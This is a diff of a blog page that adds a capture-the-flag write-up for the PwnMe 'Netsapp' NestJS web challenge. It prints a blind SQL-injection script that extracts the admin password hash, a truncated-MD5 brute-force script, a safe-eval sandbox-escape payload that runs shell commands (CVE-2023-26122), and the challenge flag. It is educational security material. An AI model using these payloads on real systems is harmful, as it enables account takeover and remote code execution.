@@ -7,7 +7,9 @@
 <meta name="robots" content="index, follow">
 <title>[PwnMe 2600] Web - Netsapp | CyberKoopas</title>
 <meta name="keywords" content="x-pwnme, web">
-<meta name="description" content="Challenge information ">
+<meta name="description" content="Challenge information The challenge is around a web app challenge based on NestJS. We are given the source code which will make it easier for us to find vulnerabilities to read the flag located in /home/flag.txt.
+First Step - The application The functionalities available on the application are :
+Create an account Login Once you create an account, you are automatically logged in /infos : We see that the parameter username is reflected on the message given to us once we logged in.">
 <meta name="author" content="
 
 ">
@@ -31,7 +33,9 @@
 
     </style>
 </noscript><meta property="og:title" content="[PwnMe 2600] Web - Netsapp" />
-<meta property="og:description" content="Challenge information " />
+<meta property="og:description" content="Challenge information The challenge is around a web app challenge based on NestJS. We are given the source code which will make it easier for us to find vulnerabilities to read the flag located in /home/flag.txt.
+First Step - The application The functionalities available on the application are :
+Create an account Login Once you create an account, you are automatically logged in /infos : We see that the parameter username is reflected on the message given to us once we logged in." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://www.cyberkoopas.fr/posts/pwnme/nestapp/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-05-06T00:00:00+00:00" />
@@ -39,7 +43,9 @@
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="[PwnMe 2600] Web - Netsapp"/>
-<meta name="twitter:description" content="Challenge information "/>
+<meta name="twitter:description" content="Challenge information The challenge is around a web app challenge based on NestJS. We are given the source code which will make it easier for us to find vulnerabilities to read the flag located in /home/flag.txt.
+First Step - The application The functionalities available on the application are :
+Create an account Login Once you create an account, you are automatically logged in /infos : We see that the parameter username is reflected on the message given to us once we logged in."/>
 
 
 <script type="application/ld+json">
@@ -68,12 +74,12 @@
   "@type": "BlogPosting",
   "headline": "[PwnMe 2600] Web - Netsapp",
   "name": "[PwnMe 2600] Web - Netsapp",
-  "description": "Challenge information ",
+  "description": "Challenge information The challenge is around a web app challenge based on NestJS. We are given the source code which will make it easier for us to find vulnerabilities to read the flag located in /home/flag.txt.\nFirst Step - The application The functionalities available on the application are :\nCreate an account Login Once you create an account, you are automatically logged in /infos : We see that the parameter username is reflected on the message given to us once we logged in.",
   "keywords": [
     "x-pwnme", "web"
   ],
-  "articleBody": "Challenge information ",
-  "wordCount" : "2",
+  "articleBody": "Challenge information The challenge is around a web app challenge based on NestJS. We are given the source code which will make it easier for us to find vulnerabilities to read the flag located in /home/flag.txt.\nFirst Step - The application The functionalities available on the application are :\nCreate an account Login Once you create an account, you are automatically logged in /infos : We see that the parameter username is reflected on the message given to us once we logged in. The message says that a regular user can’t do anything for now, we can guess that only the administrator can do something.\nAnalyzing the login functionality using Burp : We see that each time we login, a JWT access token is assigned to us, the token contains : Same for when we register an account : Now that we have explored the application, we can reduce the number of possible vulnerabilities by a lot :\nInjection on Pseudo Parameter as it is reflected on /infos Vulnerabilities around the JWT Token as it controls the authentication Second Step - Understanding the source code to find vulnerabilities Since we have the source code, we can take a look at it to confirm or not, our assumptions :\nInjection on Pseudo Parameter as it is reflected on /infos On the app.controller.ts, we see that the “/infos” page depends on the user. If the pseudo is equal to “admin”, then we have access to the safeEval function, otherwise, we have nothing. The SafeEval is a safer version of eval() but yet vulnerable to CVE-2023-26122 : https://security.snyk.io/vuln/SNYK-JS-SAFEEVAL-3373064 Which means, one of the steps of this challenge is to get access to the admin account using the JWT, before getting RCE with this CVE. Our first assumption was false, as we didn’t know yet about the SafeEval functionality that the admin have.\nVulnerabilities around the JWT Token as it controls the authentication The first assumption showed us that we needed the admin account, let’s then take a look at how the JWT Token is built to see if we can find any flaw on it. If the JWT Secret was weak, we could bruteforce it, get the secret, and build a new JWT Token with the admin as it’s username, but unfortunatly, it is not the case here.\nHow is the information inside the JWT Token built ? The JWT Token contains two informations : sub and pseudo, and they are registered on the database as id and pseudo.\nLet’s take a look at how “id” is used, we quickly find that : There is an SQL Query used to rename pseudo into username, that is vulnerable to SQL injection as it is not a prepared query.\nAdditionnal findings What happens when a user is created ? I have commented the code to help us understand it : Now, we know that the hash of the user’s password is of length 6. When we register an account, the parameters are taken from the request, which means that whatever parameter I send in the POST request, will be taken, we know previously that the ID parameter is equal to the SUB parameter in the JWT Token, which means that now we can control it’s value. What happens when a user log in ? They get the user from the database They check if the user exists The compare the user’s password from the database (which is a reduced MD5 password of length6) with the reduced MD5 hash of length 6 of the password that we entered to log in Third Step - Chain everything We have a basic knowledge on how the application works and what do we need to do in order to get RCE :\nGet the admin user account RCE with SafeEval How to do that now ?\nWhen we create an account, we can control the ID parameter of the JWT Token because the @Body will take every parameter from the body and assign it. When the JWT Token is created, it contains the “sub” and the “pseudo” parameter. The ID Parameter is equal to the “sub” one.\nWe know that there is an SQLi on the ID parameter : Which means that we now have control over the SQL Database.\nUsing the SQLi, we can get the MD5 hash of the admin account, as it is only of length 6, we can then perform a MD5 Collision.\nThe issue with this SQLi, is that the max length of the payload should be of 36 characters, otherwise you get an error.\nAfter finding the right payload, we built a script to retrieve the whole MD5 hash of the admin account :\nimport requests import uuid alphabet=\"abcdef0123456789\" cpt = 0 mdp = \"\" while (len(mdp) != 6): #We know that max length of hash is 6 for i in alphabet: # we go over the MD5 possible characters url = 'http://13.37.17.31:53414/auth/register' # url = 'http://127.0.0.1:3000/auth/register' payload = {\"pseudo\":\"z\"+str(uuid.uuid4())[:4],\"password\":\"az\",\"id\":\"z' OR password like '{}%'#\".format(mdp+i)} #we create an account and we retrieve the admin hash through the ID parameter # print(payload) headers = {'Content-Type': 'application/json'} # Envoi de la requête POST response = requests.post(url, json=payload, headers=headers) if('access_token' in response.text): access_token = response.json()['access_token'] # Paramètres de la requête GET url = 'http://13.37.17.31:53414/infos' # url = 'http://127.0.0.1:3000/infos' headers = {'Authorization': 'Bearer ' + access_token} # Envoi de la requête GET response = requests.get(url, headers=headers) # Affichage de la réponse if('admin' in response.text): mdp=mdp+i continue print(mdp) # we print the hash The SQL request is :\n`SELECT users.pseudo as username, users.id FROM users WHERE users.id = '${user.id}'`, If we exploit it, through our script :\n`SELECT users.pseudo as username, users.id FROM users WHERE users.id = '${user.id}' OR password like 'A%';`, We don’t need to select the admin using WHERE admin = .., how did we get the hash then ?\nExplication : The user DB looks like this : When we experimented on this, we saw that the table is ordered by ID, which means that to get the admin hash, we need to make sure that it is always on the first position, then by getting the first position, we get the admin hash. that is why we set the id to z…’, by having the account created being always on the last position, we can easily get each time the first position which is the admin hash : You see that any account created is placed after the admin account.\nour script run : we have successfully retrieved the admin hash that is in the database.\nNow we need to do an MD5 collision, to find any password that could have it first 6 characters being “6991d0” and any of them would work to connect as admin.\nUsing this python script, we will generate random strings, create their MD5 hash, and check if the MD5 hash starts with 6991d0 :\nimport hashlib import random import string def generate_password(length): characters = string.ascii_letters + string.digits + string.punctuation password = ''.join(random.choice(characters) for _ in range(length)) return password def generate_md5_hash(password): md5_hash = hashlib.md5(password.encode()).hexdigest() return md5_hash while True: password = generate_password(8) md5_hash = generate_md5_hash(password) print(md5_hash) if md5_hash.startswith(\"6991d0\"): break print(\"Mot de passe :\", password) print(\"Hachage MD5 :\", md5_hash) We run the script and we find : Hash of Password ‘\u0026^7w1Z( starts with 6991d0\nLet’s try it on the website : Welcome, admin !\nWe now finished the first step by getting access to the admin account, let’s go for the RCE since we now have access to SafeEval. By looking on internet for this CVE, we find several payloads : https://github.com/hacksparrow/safe-eval/issues/27\nimport('test').catch((e)=\u003e{})['constructor']['constructor']('return process')().mainModule.require('child_process').execSync('cat /home/flag.txt') We managed to get RCE despite the answer being in ASCII, we can then go on internet / dcode to convert it :\nflag :\nPWNME{G0oD_Job!!_5aFe-Ev4l_W4s_n07_V3rY_S4f3_e2} ",
+  "wordCount" : "1289",
   "inLanguage": "en",
   "datePublished": "2023-05-06T00:00:00Z",
   "dateModified": "2023-05-06T00:00:00Z",
@@ -151,11 +157,6 @@
                     <span>Tags</span>
                 </a>
             </li>
-            <li>
-                <a href="https://www.cyberkoopas.fr/about/" title="About">
-                    <span>About</span>
-                </a>
-            </li>
         </ul>
     </nav>
 </header>
@@ -167,16 +168,207 @@
     <h1 class="post-title">
       [PwnMe 2600] Web - Netsapp
     </h1>
-    <div class="post-meta"><span title='2023-05-06 00:00:00 +0000 UTC'>May 6, 2023</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;
+    <div class="post-meta"><span title='2023-05-06 00:00:00 +0000 UTC'>May 6, 2023</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;
 
 
 
 </div>
   </header> 
   <div class="post-content"><h2 id="challenge-information">Challenge information<a hidden class="anchor" aria-hidden="true" href="#challenge-information">#</a></h2>
-<p><img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/chall.png" alt="Chall"  />
+<p><img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716165129.png" alt="Image"  />
 </p>
+<p>The challenge is around a web app challenge based on NestJS. We are given the source code which will make it easier for us to find vulnerabilities to read the flag located in /home/flag.txt.</p>
+<h3 id="first-step---the-application">First Step - The application<a hidden class="anchor" aria-hidden="true" href="#first-step---the-application">#</a></h3>
+<p>The functionalities available on the application are :</p>
+<ul>
+<li>Create an account
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716173734.png" alt="Image"  />
+</li>
+<li>Login
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716173755.png" alt="Image"  />
+</li>
+</ul>
+<p>Once you create an account, you are automatically logged in /infos :
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716173830.png" alt="Image"  />
 
+We see that the parameter username is reflected on the message given to us once we logged in.
+The message says that a regular user can&rsquo;t do anything for now, we can guess that only the administrator can do something.</p>
+<p>Analyzing the login functionality using Burp :
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716174036.png" alt="Image"  />
+
+We see that each time we login, a JWT access token is assigned to us, the token contains :
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716174238.png" alt="Image"  />
+</p>
+<p>Same for when we register an account :
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716174409.png" alt="Image"  />
+</p>
+<p>Now that we have explored the application, we can reduce the number of possible vulnerabilities by a lot :</p>
+<ul>
+<li>Injection on Pseudo Parameter as it is reflected on /infos</li>
+<li>Vulnerabilities around the JWT Token as it controls the authentication</li>
+</ul>
+<h3 id="second-step---understanding-the-source-code-to-find-vulnerabilities">Second Step - Understanding the source code to find vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#second-step---understanding-the-source-code-to-find-vulnerabilities">#</a></h3>
+<p>Since we have the source code, we can take a look at it to confirm or not,  our assumptions :</p>
+<ul>
+<li>Injection on Pseudo Parameter as it is reflected on /infos
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716174912.png" alt="Image"  />
+
+On the app.controller.ts, we see that the &ldquo;/infos&rdquo; page depends on the user. If the pseudo is equal to &ldquo;admin&rdquo;, then we have access to the safeEval function, otherwise, we have nothing.
+The SafeEval is a safer version of eval() but yet vulnerable to CVE-2023-26122 :
+<a href="https://security.snyk.io/vuln/SNYK-JS-SAFEEVAL-3373064">https://security.snyk.io/vuln/SNYK-JS-SAFEEVAL-3373064</a>
+Which means, one of the steps of this challenge is to get access to the admin account using the JWT, before getting RCE with this CVE.</li>
+</ul>
+<p>Our first assumption was false, as we didn&rsquo;t know yet about the SafeEval functionality that the admin have.</p>
+<ul>
+<li>Vulnerabilities around the JWT Token as it controls the authentication
+The first assumption showed us that we needed the admin account, let&rsquo;s then take a look at how the JWT Token is built to see if we can find any flaw on it.</li>
+</ul>
+<p><img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716175307.png" alt="Image"  />
+
+If the JWT Secret was weak, we could bruteforce it, get the secret, and build a new JWT Token with the admin as it&rsquo;s username, but unfortunatly, it is not the case here.</p>
+<p>How is the information inside the JWT Token built ?
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716182034.png" alt="Image"  />
+
+The JWT Token contains two informations : sub and pseudo, and they are registered on the database as id and pseudo.</p>
+<p>Let&rsquo;s take a look at how &ldquo;id&rdquo; is used, we quickly find that :
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716180622.png" alt="Image"  />
+
+There is an SQL Query used to rename pseudo into username, that is vulnerable to SQL injection as it is not a prepared query.</p>
+<ul>
+<li>Additionnal findings
+What happens when a user is created ?
+I have commented the code to help us understand it :
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716175819.png" alt="Image"  />
+
+Now, we know that the hash of the user&rsquo;s password is of length 6.</li>
+</ul>
+<p><img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716182701.png" alt="Image"  />
+</p>
+<p>When we register an account, the parameters are taken from the request, which means that whatever parameter I send in the POST request, will be taken, we know previously that the ID parameter is equal to the SUB parameter in the JWT Token, which means that now we can control it&rsquo;s value.
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716183426.png" alt="Image"  />
+</p>
+<p>What happens when a user log in ?
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716175947.png" alt="Image"  />
+</p>
+<ol>
+<li>They get the user from the database</li>
+<li>They check if the user exists</li>
+<li>The compare the user&rsquo;s password from the database (which is a reduced MD5 password of length6) with the reduced MD5 hash of length 6 of the password that we entered to log in</li>
+</ol>
+<h3 id="third-step---chain-everything">Third Step - Chain everything<a hidden class="anchor" aria-hidden="true" href="#third-step---chain-everything">#</a></h3>
+<p>We have a basic knowledge on how the application works and what do we need to do in order to get RCE :</p>
+<ol>
+<li>Get the admin user account</li>
+<li>RCE with SafeEval</li>
+</ol>
+<p>How to do that now ?</p>
+<p>When we create an account, we can control the ID parameter of the JWT Token because the @Body will take every parameter from the body and assign it. When the JWT Token is created, it contains the &ldquo;sub&rdquo; and the &ldquo;pseudo&rdquo; parameter. The ID Parameter is equal to the &ldquo;sub&rdquo; one.</p>
+<p><img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716183426.png" alt="Image"  />
+</p>
+<p>We know that there is an SQLi on the ID parameter :
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716180622.png" alt="Image"  />
+</p>
+<p>Which means that we now have control over the SQL Database.</p>
+<p>Using the SQLi, we can get the MD5 hash of the admin account, as it is only of length 6, we can then perform a MD5 Collision.</p>
+<p>The issue with this SQLi, is that the max length of the payload should be of 36 characters, otherwise you get an error.</p>
+<p>After finding the right payload, we built a script to retrieve the whole MD5 hash of the admin account :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>alphabet<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;abcdef0123456789&#34;</span>
+</span></span><span style="display:flex;"><span>cpt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>mdp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (len(mdp) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">6</span>): <span style="color:#75715e">#We know that max length of hash is 6</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> alphabet: <span style="color:#75715e"># we go over the MD5 possible characters</span>
+</span></span><span style="display:flex;"><span>                url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://13.37.17.31:53414/auth/register&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#               url = &#39;http://127.0.0.1:3000/auth/register&#39;</span>
+</span></span><span style="display:flex;"><span>                payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;pseudo&#34;</span>:<span style="color:#e6db74">&#34;z&#34;</span><span style="color:#f92672">+</span>str(uuid<span style="color:#f92672">.</span>uuid4())[:<span style="color:#ae81ff">4</span>],<span style="color:#e6db74">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;az&#34;</span>,<span style="color:#e6db74">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;z&#39; OR password like &#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">%&#39;#&#34;</span><span style="color:#f92672">.</span>format(mdp<span style="color:#f92672">+</span>i)} <span style="color:#75715e">#we create an account and we retrieve the admin hash through the ID parameter</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#               print(payload)</span>
+</span></span><span style="display:flex;"><span>                headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>}
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># Envoi de la requête POST</span>
+</span></span><span style="display:flex;"><span>                response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, json<span style="color:#f92672">=</span>payload, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#39;access_token&#39;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text):
+</span></span><span style="display:flex;"><span>                        access_token <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#39;access_token&#39;</span>]
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Paramètres de la requête GET</span>
+</span></span><span style="display:flex;"><span>                        url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://13.37.17.31:53414/infos&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                       url = &#39;http://127.0.0.1:3000/infos&#39;</span>
+</span></span><span style="display:flex;"><span>                        headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Authorization&#39;</span>: <span style="color:#e6db74">&#39;Bearer &#39;</span> <span style="color:#f92672">+</span> access_token}
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Envoi de la requête GET</span>
+</span></span><span style="display:flex;"><span>                        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Affichage de la réponse</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text):
+</span></span><span style="display:flex;"><span>                                mdp<span style="color:#f92672">=</span>mdp<span style="color:#f92672">+</span>i
+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>print(mdp) <span style="color:#75715e"># we print the hash</span>
+</span></span></code></pre></div><p>The SQL request is :</p>
+<pre tabindex="0"><code>        `SELECT users.pseudo as username, users.id FROM users WHERE users.id = &#39;${user.id}&#39;`,
+        
+</code></pre><p>If we exploit it, through our script :</p>
+<pre tabindex="0"><code>        `SELECT users.pseudo as username, users.id FROM users WHERE users.id = &#39;${user.id}&#39; OR password like &#39;A%&#39;;`,
+        
+</code></pre><p>We don&rsquo;t need to select the admin using WHERE admin = .., how did we get the hash then ?</p>
+<p>Explication :
+The user DB looks like this :
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716190442.png" alt="Image"  />
+
+When we experimented on this, we saw that the table is ordered by ID, which means that to get the admin hash, we need to make sure that it is always on the first position, then by getting the first position, we get the admin hash.
+that is why we set the id to z&hellip;&rsquo;, by having the account created being always on the last position, we can easily get each time the first position which is the admin hash :
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716191403.png" alt="Image"  />
+
+You see that any account created is placed after the admin account.</p>
+<p>our script run :
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716184606.png" alt="Image"  />
+</p>
+<p><img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716184622.png" alt="Image"  />
+
+we have successfully retrieved the admin hash that is in the database.</p>
+<p>Now we need to do an MD5 collision,  to find any password that could have it first 6 characters being &ldquo;6991d0&rdquo; and any of them would work to connect as admin.</p>
+<p>Using this python script, we will generate random strings, create their MD5 hash, and check if the MD5 hash starts with 6991d0 :</p>
+<pre tabindex="0"><code>import hashlib
+import random
+import string
+
+def generate_password(length):
+    characters = string.ascii_letters + string.digits + string.punctuation
+    password = &#39;&#39;.join(random.choice(characters) for _ in range(length))
+    return password
+
+def generate_md5_hash(password):
+    md5_hash = hashlib.md5(password.encode()).hexdigest()
+    return md5_hash
+
+while True:
+    password = generate_password(8)
+    md5_hash = generate_md5_hash(password)
+    print(md5_hash)
+    if md5_hash.startswith(&#34;6991d0&#34;):
+        break
+
+print(&#34;Mot de passe :&#34;, password)
+print(&#34;Hachage MD5 :&#34;, md5_hash)
+</code></pre><p>We run the script and we find :
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716193549.png" alt="Image"  />
+
+Hash of Password &lsquo;&amp;^7w1Z( starts with 6991d0</p>
+<p>Let&rsquo;s try it on the website :
+<img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716193639.png" alt="Image"  />
+</p>
+<p><img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716193647.png" alt="Image"  />
+
+Welcome, admin !</p>
+<p>We now finished the first step by getting access to the admin account, let&rsquo;s go for the RCE since we now have access to SafeEval.
+By looking on internet for this CVE, we find several payloads :
+<a href="https://github.com/hacksparrow/safe-eval/issues/27">https://github.com/hacksparrow/safe-eval/issues/27</a></p>
+<pre tabindex="0"><code>import(&#39;test&#39;).catch((e)=&gt;{})[&#39;constructor&#39;][&#39;constructor&#39;](&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /home/flag.txt&#39;)
+</code></pre><p><img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716194235.png" alt="Image"  />
+
+We managed to get RCE despite the answer being in ASCII, we can then go on internet / dcode to convert it :</p>
+<p><img loading="lazy" src="/CTFs/PWNME/Web/Nestapp/Pastedimage20230716194556.png" alt="Image"  />
+
+flag :</p>
+<pre tabindex="0"><code>PWNME{G0oD_Job!!_5aFe-Ev4l_W4s_n07_V3rY_S4f3_e2}
+</code></pre>
 
   </div>
 
